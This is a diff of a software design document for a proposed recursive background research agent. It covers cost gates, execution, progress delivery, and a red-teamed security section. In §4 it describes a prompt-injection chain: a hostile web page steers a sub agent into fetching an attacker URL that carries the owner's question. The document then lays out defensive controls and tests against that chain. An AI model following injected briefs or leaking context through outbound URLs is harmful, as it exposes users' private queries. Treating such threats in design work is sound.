@@ -1,31 +1,69 @@
 # Deepest Research — a no-holds background research agent
 
-> **Status:** Proposed · **Last verified:** 2026-07-22 · **Waves:** DR1◻️ DR2◻️ DR3◻️ DR4◻️ DR5◻️ DR6◻️ DR7◻️
+> **Status:** Proposed (parked) · **Last verified:** 2026-07-22 · **Waves:** R0◻️ R1◻️ R2◻️ R3◻️ R4◻️ R5◻️ R6◻️ R7◻️ R8◻️
 
-A **no-holds** sibling to the shipped `deep_research` tool (`../plans/DEEP_RESEARCH_TOOL_PLAN.md`):
-where `deep_research` is a *bounded, single-turn* pipeline — plan → gather →
-analyze → reflect → **one** refill → synthesize → critique → **one** revise, all
-inside one owner turn — `deepest_research` removes the *effort* bounds while
-keeping every *blast-radius* bound. It is an **autonomous, resumable, background
-research run** that recurses two tiers deep, loops until the topic is covered (or
-a large resource ceiling is hit), checkpoints its state, and lands a cited report
-in the same research library.
+A **no-holds** sibling to the in-progress `deep_research` tool
+(`../plans/DEEP_RESEARCH_TOOL_PLAN.md`): where `deep_research` is a *bounded,
+single-turn* pipeline — plan → gather → analyze → reflect → **one** refill →
+synthesize → critique → **one** revise, all inside one owner turn —
+`deepest_research` removes the *effort* bounds while keeping every *blast-radius*
+bound. It is an **autonomous, resumable, background research run** that recurses
+two tiers deep, loops until the topic is covered (or a large owner-set ceiling is
+hit), checkpoints its state, sends periodic progress back to the initiating chat,
+and lands a cited report in the existing research library.
 
-This is a **Proposed** design (icebox). Nothing is built. It is on the record so
-the shape, the security carve-outs, and the wave breakdown are settled before any
-code. It reuses the shipped spawn fan, report library, and report view; the
-net-new surface is the two-tier recursion, the adaptive loop, the background
-execution lane, and the checkpoint/resume state.
+This is a **Proposed, parked** design (icebox). Nothing is built. It is on the
+record so the shape, the security carve-outs, the value gate, and the wave
+breakdown are settled before any code — and it has been **red-teamed** (five
+adversarial reviews: security, feasibility, cost/value, process, and the
+progress-transport map; their findings are folded in below and dated
+2026-07-22). It reuses a large amount of shipped substrate; the net-new surface
+is called out precisely in §5.
 
 The guiding frame, stated once: **unbounded in effort, still bounded in blast
 radius.** "No holds" relaxes the budget / depth / round holds. It does **not**
-touch the `CLAUDE.md` non-negotiables — web sandbox, SSRF-guarded egress,
-`no_memory`, no-location, no knowledge-base access, RLS domain firewalls. Those
-hold at every depth, for every agent, always.
+touch the `CLAUDE.md` non-negotiables — but note §4: the two-tier recursion does
+open a *new* exfiltration channel the shipped web sandbox does not currently
+defend, and closing it is a hard build blocker, not a footnote.
 
 ---
 
-## 1. What `deepest_research` relaxes (and what it must not)
+## §0. Value hypothesis + kill criterion (read first)
+
+This plan proposes ~10× the token cost and Phase-scale net-new infra. It is
+**parked**, and it does not proceed on faith. Two gates govern the whole thing:
+
+**The falsifiable hypothesis.** *On genuinely large questions, a bounded
+`deep_research` run at its ceiling produces reports with material, owner-visible
+coverage gaps that additional adaptive depth (more rounds, a second agent tier)
+closes — and that gain is worth its marginal token cost.*
+
+**The precondition — the deferral trigger is currently UNMET.** `deep_research`
+deferred adaptive depth with an explicit trigger: *"revisit only if the fixed-2-
+round bound proves insufficient in practice."* Walking that tool's own revision
+log (v2–v9), **every** observed on-box failure was infra/tuning — a starved
+analyst (budget-reserve bug, v3), `tree_budget_exhausted` + a wrong meter
+denominator (v5), dark phases / streaming / gpt-oss citation rendering (v7–v9).
+**Not one** entry reads "the 2-round bound left the report under-covered." The
+base tool is also not itself settled (its D3 mock-gate sign-off and on-box
+budget/wall-clock tuning are still open). So: **the trigger this plan answers to
+has not fired.** R0 exists to fire it — or kill the plan.
+
+**The park condition.** No wave past R0 is scheduled until **both**: (a) Phase 6
+(the wiki — the stated roadmap frontier, in progress) has shipped, freeing the
+frontier; **and** (b) R0 has demonstrated the value gap on the shipped tool. R0
+is a cheap standalone probe that may run opportunistically to *inform* the park;
+passing it does not by itself unpark the infra — the Phase-6 precondition still
+gates R1+.
+
+**The kill gate lives at the R1→R2 boundary** (§6): everything from R2 on is the
+expensive, hard-to-reverse surface (a reopened depth tier + its new exfil
+control, a new execution lane, a new RLS table). R0 and R1 must *prove value* on
+a pre-registered rubric before a line of that infra is written.
+
+---
+
+## §1. What `deepest_research` relaxes (and what it must not)
 
 | Hold on `deep_research` | Where | `deepest_research` |
 |---|---|---|
@@ -33,268 +71,351 @@ hold at every depth, for every agent, always.
 | `MAX_DEPTH = 1` (children are leaves) | `agent/tree.py:20` | **Two tiers** — orchestrator → task agent → sub agent (`max_depth = 2`, sub agents are leaves) |
 | One critique / revise pass | `deep_research.py` | **N passes** until the critique stops finding fixable problems (capped) |
 | `SPAWN_MULTIPLIER = 10.0` → ~8M tree | `tree.py:69` | **Owner-set per-run token ceiling** (big, not infinite) |
-| `TREE_WALL_CLOCK_S = 3000s`, one turn | `tree.py:78` | **Background run**, minutes-to-hours, resumable across worker restarts |
-| Runs in-request, blocks the turn | `deep_research.py` | **Enqueue-and-return**; owner is notified on completion |
+| `TREE_WALL_CLOCK_S = 3000s`, one turn | `tree.py:78` | **Background run**, minutes-to-hours, resumable across restarts |
+| Runs in-request, blocks the turn | `deep_research.py` | **Enqueue-and-return**; periodic progress + completion nudge to the chat |
 
 **Untouched — the non-negotiables, at every depth (`spawn.py:526-534`, CLAUDE.md):**
 `no_memory=True`, empty `domain_scopes`, empty read scope, `here`/`here_as_of`
-None (no location), SSRF-guarded web egress, no KB access, RLS. A sub agent two
-tiers down is exactly as sandboxed as a top-tier one.
+None (no location), no KB access, RLS. **One caveat (§4):** the web *egress*
+sandbox's safety rests on "no owner data in context," which this design breaks by
+threading the owner's question into every brief — that gap gets a dedicated
+control and gate, not a hand-wave.
 
 ---
 
-## 2. Settled decisions (owner)
+## §2. Settled decisions (owner)
 
-1. **A background run, not an in-request tool.** The owner-facing `deepest_research`
-   tool *enqueues* a run and returns immediately (*"started run #N, ~30–60 min,
-   I'll have it ready"*). A dedicated execution lane drives it. Rationale: a
-   no-holds run is minutes-to-hours; it cannot live inside one synchronous owner
-   turn, and it must not block the single-threaded job worker (§5).
+1. **A background run, not an in-request tool.** The owner-facing tool *enqueues*
+   a run and returns immediately; periodic progress flows back to the chat (§3.5).
 
 2. **Two-tier recursion: `orchestrator → task agent → sub agent`, and no deeper.**
-   `max_depth = 2`. A **task agent** (depth 1) is assigned one major sub-question
-   and *may* spawn **sub agents** (depth 2) to decompose it; a sub agent is a hard
-   leaf. This reopens — deliberately and in a **bounded** form — the `depth≥1`
-   spawning that `tree.py:16-19` closed. It is defensible because privilege only
-   ever *narrows* with depth and the sandbox floor is identical at every level
-   (§4). Depth is a property of the **run**, not a global flip: `TreeState` carries
-   `max_depth` (default `1`); only a trusted deepest run seeds it at `2`, so jerv's
-   ordinary `spawn_subagent` stays depth-1.
+   `max_depth = 2`. A **task agent** (depth 1) may spawn **sub agents** (depth 2)
+   to decompose one major sub-question; a sub agent is a hard leaf. This reopens —
+   deliberately, in a bounded form — the `depth≥1` spawning `tree.py:16-19`
+   closed. It is defensible **only with the §4 controls in place** (the shipped
+   sandbox alone does not make it safe). Depth is a property of the **run**:
+   `TreeState` carries `max_depth` (default `1`); only a trusted deepest run seeds
+   it at `2`, so jerv's ordinary `spawn_subagent` stays depth-1.
 
-3. **Adaptive loop, resource-terminated — not literally infinite.** The round count
-   is unbounded; the *terminal condition* is coverage-and-stability **or** a hard
-   resource ceiling (tokens / wall-clock / agent count) **or** diminishing returns
-   (a round adds < N new sources / no new claims — the loop-until-dry pattern).
-   "No unbounded autonomous loop" (the lean litmus `deep_research` obeys) is
-   preserved in substance: the loop always has a terminating resource bound; it is
-   just a much larger one, and the owner sets it.
+3. **Adaptive loop, resource-terminated — not literally infinite.** The round
+   count is unbounded; the terminal condition is coverage-and-stability **or** a
+   hard resource ceiling **or** diminishing returns (a round adds < N new sources
+   / no new claims). "No unbounded autonomous loop" is preserved in substance: the
+   loop always has a terminating resource bound, just a larger, owner-set one.
 
-4. **Owner-set per-run cost ceiling, surfaced.** A no-holds run could be 50–100M
-   tokens — a real dollar figure. Every run carries an owner-set token + wall-clock
-   ceiling (a generous default, an owner override), shown before kickoff and
-   enforced as the hard terminal bound.
+4. **Owner-set per-run cost ceiling, surfaced with its worst case.** A run could
+   be tens of millions of tokens. The owner sets a token + wall-clock ceiling and
+   is shown, before kickoff, both the expected cost **and** the §4 worst-case
+   attacker-steerable spend (residual, quantified).
 
-5. **Same deliverable, same library.** The finished report lands in the existing
-   `app.research_reports` table (RLS `external`, migration 0140) and renders in the
-   existing `deep_research_report` view — extended with the deeper provenance
-   (tiers used, rounds, tokens spent, resume count). No new report surface.
+5. **Same library, coexisting with `deep_research`.** The report lands in
+   `app.research_reports` (migration 0140). But the table is `UNIQUE(question_hash)`
+   and `persist_report` upserts newest-wins (`research_corpus.py:146`) — a deepest
+   run and a prior deep run on the *same question* would clobber each other. R7
+   makes the dedup key **tool-aware** (the `tool` column exists, `0140:60`) so both
+   coexist. "No new report surface" is therefore *not* absolute — it is a
+   constraint change, scoped and owned by R7.
 
-6. **Reuse the spawn substrate.** Every fan — top-tier task agents, their sub-agent
-   fans, the cross-check analyst, the critique — runs through `SpawnService`'s
-   existing fan machinery (`run_research_fan` / `_spawn_waves`), so the parent⊆child
-   tool clamp, the sandbox, and the shared tree budget apply unchanged.
+6. **Reuse the spawn substrate + the headless run context.** Every fan runs
+   through `SpawnService`'s existing machinery, and the background driver **reuses
+   the existing headless agent-turn context** (`tasks/runner.py`), not a net-new
+   one (§5).
 
 ---
 
-## 3. The design
+## §3. The design
 
-### 3.1 Execution model — a background run driven off a checkpoint
+### 3.1 Execution model — a concurrent background run driven off a checkpoint
 
 ```
-owner turn:  deepest_research(question, ceiling?) ──enqueue──▶ returns "run #N started"
+owner turn:  deepest_research(question, ceiling?) ──enqueue──▶ "run #N started"
                                                                      │
-research lane (dedicated, off the job worker):                       ▼
-   seed TreeState(max_depth=2, budget=ceiling, wall_clock=ceiling)
+concurrent detached task (own lifecycle/cancellation, NOT the shared worker loop):
+   reuse headless run-context (tasks/runner.py) + seed TreeState(max_depth=2, ceiling)
    ┌─────────────────────────────── round loop ───────────────────────────────┐
-   │ plan/expand the research tree (orchestrator-side)                          │
-   │ dispatch task-agent fan  ── each task agent may spawn a sub-agent fan ──   │
+   │ plan / expand the research tree (orchestrator-side)                        │
+   │ dispatch task-agent fan  ── each task agent: ONE decomposition sub-fan ──  │
    │ analyze (cross-check)  →  reflect (coverage + diminishing-returns judge)   │
-   │ checkpoint round state → research_run_state  (RESUMABLE POINT)             │
-   │ covered-and-stable? or ceiling hit? or dry? ── no ──▶ next round           │
+   │ COMMIT round → research_run_state  +  progress turn → chat  (§3.5)         │
+   │   (resumable point: in-flight/uncommitted round work is re-run, not        │
+   │    reconstructed)                                                          │
+   │ covered-and-stable? ceiling hit? dry? ── no ──▶ next round                 │
    └──────────────────────────────── yes ──────────────────────────────────────┘
-   synthesize → critique → revise (loop, capped) → persist report → notify owner
+   synthesize → critique → revise (capped) → COMMIT report → persist → notify owner
 ```
-
-The **resumable point** is the per-round checkpoint: if the worker/box restarts
-mid-run, the lane rehydrates the tree state (plan, findings, sources, coverage,
-round N) and continues — the engine has no resume today, so this is net-new (§5).
 
 ### 3.2 The two-tier fan (settled decision 2)
 
-- **Orchestrator (depth 0)** — the run driver. Plans the top-tier sub-questions,
-  dispatches the task-agent fan, and owns *all* judgment: cross-check, coverage,
-  diminishing-returns, synthesis, critique. It grows the research tree across
-  rounds from the task agents' *summaries* (never their raw fetched text).
-- **Task agent (depth 1)** — assigned one major sub-question. Researches it, and
-  when the sub-question is genuinely compound, emits a **structured decomposition**
-  (a small set of sub-briefs, same shape as the orchestrator's plan schema) that
-  spawns a bounded **sub-agent fan**. It then synthesizes its sub agents'
-  summaries into one finding handed back up.
-- **Sub agent (depth 2)** — a hard leaf on a narrow slice. Searches, reads, cites,
-  summarizes. Cannot spawn (`depth >= max_depth`).
-
-The spawn *decision* at depth 1 is **structured, not free-form**: a task agent
-does not get a raw "spawn anything" affordance; it emits a decomposition that runs
-through the same validated fan with the sandbox clamp. (Laundering is still
-possible in principle — see §4 — but the sub agent it yields is just as sandboxed
-as itself.)
+- **Orchestrator (depth 0)** — the run driver. Plans, dispatches the task-agent
+  fan, and owns *all* judgment (cross-check, coverage, diminishing-returns,
+  synthesis, critique). Grows the tree across rounds from task agents' *summaries*.
+- **Task agent (depth 1)** — assigned one major sub-question. When it is genuinely
+  compound, the task agent emits **exactly one structured decomposition** (§4
+  control) that spawns a bounded sub-agent fan, then synthesizes their summaries
+  into one finding handed up. It does **not** get a raw spawn tool.
+- **Sub agent (depth 2)** — a hard leaf. Searches, reads, cites, summarizes.
+  Cannot spawn (`depth >= max_depth`).
 
 ### 3.3 The adaptive loop (settled decision 3)
 
-`reflect` already returns a coverage verdict + gaps (`_REFLECT_SCHEMA`). The loop
-generalizes it: after each round the orchestrator judges **covered** (the
-question is answered across the outline) **and stable** (this round's new findings
-didn't move the picture — the diminishing-returns signal). It continues while
-*not (covered and stable)* **and** the resource ceiling holds **and** the round
-added material. Each of the three terminal conditions is logged so the report can
-say *why* it stopped (covered / ceiling / dry).
+The coverage half reuses `reflect`'s `{covered, gaps}` verdict. The **stability /
+diminishing-returns half is net-new** — `_REFLECT_SCHEMA` has no such field. The
+source-delta signal is mechanical (round-over-round `_collect_sources` diff,
+`deep_research.py:241`); the "picture didn't move" judgment is a **new prompt +
+schema field** (an R1 deliverable, not a free generalization). The loop continues
+while *not (covered and stable)* **and** the ceiling holds **and** the round added
+material; each terminal reason (covered / ceiling / dry) is logged so the report
+states *why* it stopped.
 
 ### 3.4 Cost & termination (settled decision 4)
 
-`TreeState` gains an owner-set `budget` and `deadline` sized from the run ceiling
-(not the fixed `SPAWN_MULTIPLIER`). The existing `children_exhausted` /
-`out_of_time` gates already stop fans at the ceiling; the loop checks them between
-rounds. A per-round floor guarantees at least the synthesis completes (the
-root-reserve pattern, `tree.py:183-196`, carries over).
+`TreeState` gains an owner-set `budget` and an **absolute-UTC** `deadline` sized
+from the run ceiling (not `SPAWN_MULTIPLIER`). Two recursion-specific fixes over
+the shipped single-tier model (§5): the wall-clock must survive a restart, and
+the agent-count / spend accounting must be **per-round-committed** so a resumed
+round does not double-count.
+
+### 3.5 Periodic progress back to the initiating chat (the requested component)
+
+The in-request tool streams `ToolProgressEvent`s into the *live turn's* SSE
+(`ctx.emit_event`, `loop.py:670`) — a per-run in-memory broker that dies when the
+turn ends. A background run has no live turn, so that transport does not carry.
+The design instead reuses two **already-proven off-turn** paths:
+
+- **Durable delivery into the chat** — each round-commit appends a compact
+  progress turn to the initiating session via `AgentTranscript.record_exchange`
+  (owner-RLS, append-only `agent_turns`), exactly as `tasks/runner.py:205` already
+  does off-turn. It renders on the next session load.
+- **The nudge** — a `notify_owner`/`NotifyBus` notification (its `ref` already
+  carries `session_id` for deep-link) plus an FCM content-free `poke`
+  (`push/sender.py`), so the owner is pulled back even with the app closed —
+  exactly the Task runner's completion path (`runner.py:242-259`), but emitted
+  **per round**, not once.
+
+Cadence = per round + key transitions (started, gap round, synthesizing, done).
+**Deferred (§8):** *live, in-place* streaming into an already-open surface between
+turns — no per-session standing channel exists today; building one (a session-
+keyed SSE mirroring `NotifyBus`, or keeping a `_LiveTurn`-style broker alive for
+the run) is a separate transport project. The transcript-append + nudge is the
+shipped-substrate path and is sufficient for R6.
 
 ---
 
-## 4. Security — why two tiers is defensible, and what it costs
+## §4. Security — the two-tier recursion opens a new exfil channel; here is the real argument
 
-`tree.py:16-19` closed `depth≥1` spawning for two reasons: the model "wouldn't use
-it reliably," and it "carried the depth≥1 **brief-laundering** surface" — a
-depth-1 child turning attacker-controlled fetched web text into a spawn brief.
-Reopening it (bounded to one extra tier) is a real security decision. Here is the
-argument and the controls.
+`tree.py:16-19` closed `depth≥1` spawning for **two** reasons: the model
+"wouldn't use it reliably" (a *value* concern, folded into the R2 gate) and the
+"**brief-laundering** surface." Reopening it is a real security decision. The
+draft's original claim — *"a laundered brief can only cause more sandboxed web
+research, not exfiltration"* — **does not survive the red-team, and is retracted.**
 
-**The argument: privilege narrows down, the sandbox floor is flat.**
-- The parent⊆child tool clamp composes (`effective_child_tools`, `spawn.py:140`):
-  `sub-agent tools ⊆ task-agent tools ⊆ orchestrator tools`. A sub agent can never
-  hold a tool its task agent lacks.
-- Every agent at every depth is minted with the same sandbox (`no_memory`, empty
-  domain + read scope, no location, SSRF-guarded web). A depth-2 sub agent has
-  **no privilege a depth-1 agent lacked** — there is nothing further down to
-  escalate *to*.
-- Therefore a laundered brief cannot cause data exfiltration or firewall crossing.
-  It can only cause **more sandboxed web research** — a **resource-amplification**
-  risk (wasted budget on attacker-steered searches), not a confidentiality or
-  integrity one.
+**The exfiltration channel (retracts "nothing to exfiltrate").** The SSRF guard
+blocks only private/loopback/reserved hosts (`web/fetch.py:275-289`); a routable
+**public** host passes. The sandbox is **not** empty of sensitive data — the
+design threads the **owner's question** (and, up-tree, fed summaries) verbatim
+into every brief. So a live channel exists: attacker page read at depth 1/2 →
+injected brief → sub agent `web_fetch`es `attacker.com/leak?q=<owner question +
+fed context>`. `fetch.py`'s own safety rationale (lines 8-9) *explicitly* rests on
+"no owner data in context" — a precondition this design breaks. It is both an
+exfiltration channel (in-context brief text leaves via the URL) and an integrity
+channel (the attacker steers what gets searched and narrated back).
 
-**The controls (what turns "acceptable in principle" into "bounded in practice"):**
-1. **Depth ceiling is structural and run-scoped.** `max_depth = 2` on the run's
-   `TreeState` only; depth-2 refuses to spawn. Global default stays `1`.
-2. **Re-sized, per-tier caps.** `MAX_TOTAL_AGENTS_PER_TREE = 12` was sized for a
-   flat fan; a two-tier tree needs a larger tree ceiling **and** a per-task-agent
-   sub-fan cap (e.g. a task agent may spawn ≤ K sub agents), so one laundered brief
-   cannot explode the fan. Amplification is bounded by the tree total × the token
-   ceiling, both hard.
-3. **Structured spawn decision at depth 1** (§3.2) — a decomposition schema, not a
-   free-form spawn tool.
-4. **Judgment stays orchestrator-side.** Coverage, cross-check, and synthesis run
-   at depth 0 over *summaries*, so a laundered sub agent's junk findings are
-   cross-checked and down-weighted, never trusted directly into the report.
-5. **A hard security gate before enabling depth-2 in prod** (Wave DR2): an
-   isolation test proving a depth-2 sub agent cannot reach memory, a domain scope,
-   location, or a tool outside its task agent's clamp — the new-table + new-depth
-   RLS/isolation coverage `CLAUDE.md` rule 3 requires.
+**What actually holds — the tool-clamp half.** `sub ⊆ task_effective ⊆
+orchestrator` is real and monotone: a child loop's `ctx.agent_tools` is the
+*already-clamped* set (`loop.py:470,480`), and `_run_child` passes
+`tools_allow=child_tools` = the clamped intersection (`spawn.py:859`). A depth-2
+sub agent cannot hold a tool its task agent lacks — **provided** the net-new
+decomposition path clamps against the *task agent's effective* tools, not the
+orchestrator's or the sub-persona's raw set. Fan-count amplification is also hard-
+bounded — `can_admit` is a global counter (`tree.py:144`), so recursion cannot
+explode agent count.
 
-**Residual risk, accepted and capped:** a maliciously-crafted web page read by a
-task agent could steer it to spawn sub agents on attacker-chosen searches, wasting
-run budget. Bounded by the per-run token ceiling, the tree agent cap, and the
-per-task-agent sub-fan cap. No data leaves the sandbox; the firewall never opens.
+**The controls — required, and mostly NOT in code today.** Two of the four
+controls the draft claimed are vapor: there is no per-parent sub-fan cap
+(`run_research_fan` has only the tree-wide total, `spawn.py:572`) and no
+decomposition tool (the only depth-≥1 affordances are `spawn_subagent`, hard-gated
+at depth 0, and internal `run_research_fan`, ungated). Enabling depth-1 spawning
+also **deletes the belt-and-suspenders leaf guarantee** (personas hold no spawn
+tool, `spawn.py:18-19`) — depth becomes the *sole* guard. So the controls are R2
+**build blockers**, not open decisions:
 
----
+1. **Egress-exfil control** (the new one) — one of: an egress **allowlist**
+   (search-engine + fetched-link hosts only); a guard that **no brief/question
+   text may appear in an outbound URL** (path/query); or **never embed the raw
+   owner question** in a sub-agent brief — pass a sanitized topic label only.
+2. **Decomposition-only spawn** — the task-agent persona reaches spawning *only*
+   through a structured decomposition tool that **refuses free-form/raw spawn
+   args**. No raw spawn affordance at depth 1.
+3. **Per-task-agent sub-fan cap `K`** — enforced as a **per-parent** counter in
+   `TreeState` (not just `max_total_agents`). Moved out of §9 into an R2 blocker.
+4. **One-shot decomposition** — a task agent gets **exactly one** decomposition
+   round (a per-agent "already decomposed" flag on `TreeState`), so it cannot read
+   sub-fan-1's fetched content and then spawn sub-fan-2 embedding it + an attacker
+   URL (the lateral cross-fan exfil path). Structural, not prompt-enforced.
+5. **Run-scoped `max_depth`, seed-guarded** — `spawn.py:427` and
+   `deep_research.py:296` read the module constant today; both must read
+   `tree.max_depth`, and the seeding paths (`api/agent.py:785`, the scheduled
+   runner) must be *unable* to mint `max_depth>1`. A seed bug = silent global depth
+   escalation.
+6. **Two-tier reserve** — at two tiers, up to `max_parallel²` model calls can be
+   in flight across the pool boundary (the single-tier overshoot bound,
+   `tree.py:96-104`, squared), and `stage_reserve`'s single-level stepping
+   (`DR_ANALYST_RESERVE`/`DR_CRITIQUE_RESERVE`) does not compose. Total spend stays
+   hard-bounded by `tree_budget`; the *synthesis reserve* needs a tree-wide
+   concurrency semaphore + a recursion-aware reserve redesign.
 
-## 5. Substrate grounding (what exists, what's net-new)
+**The R2 security gate (100% coverage, `CLAUDE.md` rule 3)** must include, and the
+draft's single "isolation test" is insufficient:
+- an **egress-exfil test** that instruments the *outbound URLs a depth-2 agent
+  attempts* — because with a faked web transport (how these tests run)
+  `guard_public_host` is skipped (`fetch.py:207,263-264`), so the SSRF guard proves
+  nothing; the test must assert on URLs directly.
+- a **transitivity test** — orchestrator lacks tool X, both task and sub personas
+  list X → assert the sub agent does **not** get X.
+- a **negative-depth test** — an ordinary (non-deepest) turn's `TreeState` has
+  `max_depth==1` and a depth-1 child is refused spawning even with the depth-2 code
+  compiled in.
+- the memory / domain-scope / location / one-shot-decomposition isolation asserts.
 
-Verified against the codebase (file:line anchors):
-
-**Reuse as-is:**
-- **Spawn fan** — `SpawnService.run_research_fan` (`spawn.py:572`) and the staged
-  `_spawn_waves` (`spawn.py:603`); the parent⊆child clamp (`spawn.py:140`); the
-  sandbox mint (`spawn.py:526-534`); `_ChildResult` carrying `summary`,
-  `web_sources`, `session_id`, `ok`, `truncated` (`spawn.py:110-137`).
-- **Report library** — `app.research_reports` (migration 0140), RLS domain-scoped
-  `external`, `persist_report` upserting on `question_hash` (`research_corpus.py:97`).
-- **Report view** — `deep_research_report` (`deep_research.py:807`), citations via
-  `[^n] → web_sources[n-1]`.
-- **Composition root** — `readtools.py build_registry` wires `DeepResearchRef`
-  late-bound (`readtools.py:660`, `755-768`); a `DeepestResearchRef` slots in the
-  same way.
-- **Notification** — the Routine / push substrate exists for "ping the owner when
-  the run finishes."
-
-**Net-new (the real work):**
-- **`max_depth` on `TreeState`** (`tree.py`) + the depth check reading it
-  (`spawn.py:427`, `deep_research.py:296`), so depth-2 is run-scoped.
-- **A trusted background research run-context** that seeds a `TreeState` *outside*
-  the interactive turn. Today `ctx.tree is None → refuse` (`spawn.py:421`) and the
-  tree is seeded only at `api/agent.py:785`; the scheduled runner is explicitly
-  refused. The lane needs a trusted path that seeds a tree for *this driver only*.
-- **A dedicated execution lane.** The job worker is **single-threaded**
-  (`worker.py:338`); a 20-minute research run enqueued as one fat job blocks
-  ingest/embed/integrate for everyone. The lane runs off the shared worker.
-- **`research_run_state` checkpoint table** (RLS `external`, mirroring 0140) — plan,
-  findings-so-far, sources, coverage, round N — written each round, so a run
-  resumes after restart. The engine has **no checkpoint/resume** today
-  (`runlog.py`: status + a `progress_note` string only).
-- **The adaptive loop + diminishing-returns judge** (§3.3).
-- **The owner-facing kickoff tool** (enqueue-and-return) + per-run ceiling + a
-  coarse live-progress surface (`progress_note`-grade; rich live-fan streaming from
-  a background run is deferred, §8).
+**Residual, quantified and accepted (settled decision 4).** With a resized tree
+cap of ~N agents × `CHILD_MAX_COST_TOKENS` (900k), the worst case is *tens of
+millions of attacker-steerable tokens per run*, bounded by the owner ceiling. The
+owner approves that figure explicitly at kickoff. A tighter ceiling triggered by
+an injection heuristic is **out of scope** (not detectable today) but named here.
 
 ---
 
-## 6. Waves
+## §5. Substrate grounding (corrected against the code, 2026-07-22)
+
+**Reuse as-is (more than the first draft credited):**
+- **Spawn fan** — `run_research_fan` (`spawn.py:572`), `_spawn_waves` (`:603`),
+  the parent⊆child clamp (`:140`), the sandbox mint (`:526-534`), `_ChildResult`
+  (`:110-137`).
+- **Headless background run-context** — the draft called this "net-new
+  scaffolding"; it is **not**. `TaskRunner.run` (`tasks/runner.py:150`) already
+  drives a full `AgentLoop.run_stream` turn with **no HTTP request** —
+  reconstructing `read_context`, minting a session, resolving the owner principal
+  (`:159-213`). The *only* reason a task turn hits `ctx.tree is None → refuse`
+  (`spawn.py:421`) is that `LoopTurnExecutor.run_turn` calls `run_stream(...)`
+  **without** `tree=` (`runner.py:105-117`). Seeding the tree is one argument, not
+  a subsystem.
+- **Findings state is serializable** — the draft called this "the real work"; it
+  is largely free. `_ChildResult` is a frozen dataclass of str/bool/tuple
+  (`spawn.py:110-137`); `WebSource` is a Pydantic `BaseModel` (`contracts.py:136`).
+  No live sessions/router handles are stored. Only `TreeState` needs work (below).
+- **A resume precedent to mirror** — the workflow engine has no checkpoint/resume,
+  but the media-analysis off-turn job does: a `status='running'` long job with a
+  durable one-shot resume claim (`media_analysis_results` + `resumed_at`, migration
+  0138, `agent/media_results.py:172-205`). `research_run_state` should copy its
+  running-status + atomic-`claim_resume` shape.
+- **Report library / view / composition root / notify + transcript paths** — as in
+  §2.5, §3.5; the `deepest_research` tool wires late-bound like `DeepResearchRef`
+  (`readtools.py:660,755-768`).
+
+**Net-new (the genuine work, corrected):**
+- **A concurrent detached execution lane.** "Off the worker" is necessary but
+  **not sufficient** — both the job worker (`worker.py:338`) *and* the tasks loop
+  (`tasks/scheduler.py:59-61`, `for task in due: await runner.run(...)`) run their
+  work **sequentially**; a 30-min run in either blocks everything else. The
+  requirement is a genuinely concurrent detached task (`asyncio.create_task`) with
+  its **own** idle/wall-clock watchdog + cancellation — it runs outside both the
+  `/chat` turn timeout (`api/agent.py`, `_MAX_TURN_WALL_CLOCK_S`) and the worker's
+  machinery, so neither backstop covers it.
+- **`TreeState` made restart-safe** — persist `deadline` as **absolute UTC**
+  (monotonic `time.monotonic()+…`, `tree.py:132`, is meaningless after restart) and
+  re-derive on rehydrate; commit `spent`/`agents_spawned` at **round boundaries**
+  and rewind to the last committed round on resume (they never reset per round
+  today, `tree.py:106,148`, so a many-round two-tier run blows past `12` and a
+  re-run round double-counts → the run refuses its own fans).
+- **`research_run_state` checkpoint table** (RLS `external`, + isolation test),
+  round-boundary writes, rehydrate-and-continue.
+- **The adaptive stability judge** (§3.3), the egress-exfil control + the R2 gate
+  tests (§4), the decomposition tool + per-parent cap, the progress channel (§3.5).
+- **The trusted seed path** and its negative-depth guard (§4 control 5).
+
+---
+
+## §6. Waves
 
 | Wave | Deliverable | Gate |
 |---|---|---|
-| **DR1** | **Adaptive loop spike** — the resource-bounded reflect→refill loop + diminishing-returns judge, *in-request, depth-1 only*, behind a `deep_research(mode=deepest)` path. Proves the depth value cheaply before any background/recursion infra. | Loop terminates on all three conditions in tests (faked LLM); no wall-clock regression to the existing tool. |
-| **DR2** | **Two-tier recursion** — `max_depth` on `TreeState`; run-scoped depth-2; structured depth-1 decomposition; re-sized per-tier caps. **Hard security gate**: depth-2 isolation test (no memory / domain / location / tool-clamp escape). | Isolation test green; caps proven to bound a synthetic laundered-brief fan. |
-| **DR3** | **Background execution lane** — the dedicated runner off the job worker; the trusted research run-context seeding a `TreeState` outside the interactive turn. | A run completes off the worker without blocking a concurrent ingest job. |
-| **DR4** | **Checkpoint / resume** — `research_run_state` table (RLS `external` + isolation test); per-round write; rehydrate-and-continue after a simulated restart. | Kill-mid-run → resume produces the same report as an uninterrupted run. |
-| **DR5** | **Kickoff tool + cost governance** — `deepest_research` enqueue-and-return tool; owner-set per-run token/wall-clock ceiling shown pre-kickoff; completion notification. | Ceiling enforced as the terminal bound; owner notified on finish. |
-| **DR6** | **Report landing + provenance** — lands in `research_reports`; extend the report view with tiers/rounds/tokens/resume-count provenance. | Report renders with citations + deep provenance strip. |
-| **DR7** | **Frontend** — a run screen entry for an in-flight deepest run (coarse progress) + the finished-report surface. | Owner can see a run in flight and open its report. |
+| **R0** | **Raise-the-constants probe** (no new code beyond constants + a bench harness). Raise `deep_research`'s `MAX_RESEARCH_ROUNDS`, gap-k, breadth to a ceiling; run a fixed benchmark of ≥8 genuinely-large questions; blind-rate vs today's default. | **The §0 kill gate.** Only a demonstrated coverage gap (bounded-at-ceiling still under-covers *for lack of rounds*, not tuning/search/synthesis) authorizes R1. |
+| **R1** | **Adaptive loop spike** — the resource-bounded reflect→refill loop + the **new** diminishing-returns judge (a co-located `.prompt` + schema field, versioned per DEVELOPMENT.md), *in-request, depth-1 only*, as `deep_research(mode=deepest)`. | **Value, not just correctness.** On the R0 benchmark, blind-rate default vs bounded-at-ceiling vs adaptive on a **pre-registered** rubric. **KILL R2–R8 if:** the adaptive run is not preferred over bounded-at-ceiling on a clear majority; or its marginal gain per +1M tokens is below a pre-registered threshold; or the gaps trace to something other than round-depth. Loop also terminates on all three conditions in tests. |
+| **R2** | **Two-tier recursion + its security controls** — run-scoped `max_depth` on `TreeState`; the decomposition-only spawn tool (refuses free-form); per-parent cap `K`; one-shot-decomposition flag; the egress-exfil control (§4). | **Security gate at 100%:** egress-exfil (URL-instrumented), transitivity, negative-depth, memory/domain/location/one-shot isolation tests (§4). **Plus a value check:** depth-1 decomposition reliably beats a flat fan of equal agent count. |
